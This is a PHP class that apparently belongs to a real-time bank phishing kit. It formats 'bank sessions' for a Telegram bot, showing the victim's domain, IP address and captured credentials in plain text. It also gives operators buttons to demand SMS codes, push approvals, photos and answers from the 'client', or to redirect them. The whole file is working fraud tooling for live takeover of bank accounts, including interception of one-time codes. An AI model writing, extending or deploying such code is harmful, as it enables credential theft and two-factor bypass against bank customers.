<?php

namespace App\Services\Telegram;

use App\Enums\ActionType;
use App\Enums\BankSessionStatus;
use App\Models\BankSession;
use App\Models\PreSession;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardButton;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardMarkup;

class TelegramCardBuilder
{
    public static function getDisplayName(string $slug): string
    {
        return $slug;
    }

    public function buildCardText(BankSession $session): string
    {
        $lines = [];
        $status = match($session->status) {
            BankSessionStatus::Pending   => '🆕 Новая',
            BankSessionStatus::Assigned  => '⏳ В работе',
            BankSessionStatus::Completed => '✅ Завершена',
            default                      => '❓',
        };

        $logTag  = $session->log_number !== null ? "  <code>#log{$session->log_number}</code>" : '';
        $lines[] = "🧾 <b>Сессия</b>  |  {$status}{$logTag}";
        if ($session->domain) {
            $lines[] = "🌐 " . e($session->domain);
        }
        if ($session->ip_address) {
            $lines[] = "🌍 IP " . e($session->ip_address);
        }

        $creds = $session->credentials ?? [];
        if ($creds) {
            $lines[] = '';
            foreach ($creds as $k => $v) {
                $lines[] = '<b>' . e(ucfirst($k)) . '</b>: <code>' . e((string) $v) . '</code>';
            }
        }

        $answers = $session->answers ?? [];
        if ($answers) {
            $lines[] = '';
            $lines[] = '<b>Ответы:</b>';
            foreach ($answers as $i => $a) {
                $cmd = $a['command'] ?? '?';
                if ($cmd === 'photo.request') {
                    $lines[] = sprintf('%d. 📷 Фото от клиента', $i + 1);
                    continue;
                }
                if ($cmd === 'photo.question') {
                    $answerText = (string) ($a['payload']['answer'] ?? '');
                    $lines[] = sprintf('%d. 📸❓ Ответ на фото-вопрос → <code>%s</code>', $i + 1, e($answerText));
                    continue;
                }
                $payload = $a['payload'] ?? [];
                $value   = count($payload) === 1
                    ? (string) array_values($payload)[0]
                    : implode(' ', array_values($payload));
                $lines[] = sprintf('%d. %s → <code>%s</code>', $i + 1, e($cmd), e($value));
            }
        }

        $current = $session->action_type['type'] ?? 'idle';
        $stateLabel = match ($current) {
            'hold.short'         => '⏳ Ожидание (короткое)',
            'hold.long'          => '⏳ Ожидание (долгое)',
            'sms'                => '📱 Ожидает SMS-код',
            'push'               => '🔔 Ожидает Push',
            'invalid-data'       => '❌ Неверные данные',
            'question'           => '❓ Вопрос клиенту',
            'error'              => '⚠️ Ошибка',
            'photo.with-input'   => '📸 Ожидает фото + текст',
            'photo.without-input' => '📸 Ожидает фото',
            'photo.request'      => '📷 Запрос фото у клиента',
            'photo.question'     => '📸❓ Фото-вопрос (ждёт ответ)',
            'redirect'           => '🔗 Редирект',
            default              => 'Новая',
        };
        $lines[] = '';
        $lines[] = '<i>Состояние: ' . $stateLabel . '</i>';

        return implode("\n", $lines);
    }

    public function buildKeyboard(BankSession $session): InlineKeyboardMarkup
    {
        $sid = $session->id;

        if ($session->isCompleted()) {
            return InlineKeyboardMarkup::make();
        }

        if ($session->isPending()) {
            return InlineKeyboardMarkup::make()
                ->addRow(
                    InlineKeyboardButton::make('📥 Назначить', callback_data: "assign:{$sid}"),
                );
        }

        // Assigned — full action keyboard
        $btn = fn(ActionType $a) => InlineKeyboardButton::make(
            text: $a->buttonLabel(),
            callback_data: "action:{$sid}:{$a->value}",
        );

        $preSession = $session->ip_address
            ? PreSession::where('bank_slug', $session->bank_slug)
                ->where('ip_address', $session->ip_address)
                ->latest()
                ->first()
            : null;

        $keyboard = InlineKeyboardMarkup::make()
            ->addRow($btn(ActionType::Sms), $btn(ActionType::Push))
            ->addRow($btn(ActionType::InvalidData), $btn(ActionType::Error))
            ->addRow($btn(ActionType::Question))
            ->addRow($btn(ActionType::PhotoWithInput), $btn(ActionType::PhotoWithoutInput))
            ->addRow($btn(ActionType::PhotoRequest), $btn(ActionType::PhotoQuestion))
            ->addRow($btn(ActionType::HoldShort), $btn(ActionType::HoldLong))
            ->addRow($btn(ActionType::Redirect))
            ->addRow($btn(ActionType::Idle))
            ->addRow(
                InlineKeyboardButton::make('✅ Завершить', callback_data: "complete:{$sid}"),
                InlineKeyboardButton::make('📤 Снять',    callback_data: "unassign:{$sid}"),
            );

        if ($preSession) {
            $keyboard->addRow(
                InlineKeyboardButton::make('🌐 Онлайн?', callback_data: "presession:online:{$preSession->id}"),
            );
        }

        return $keyboard;
    }
}
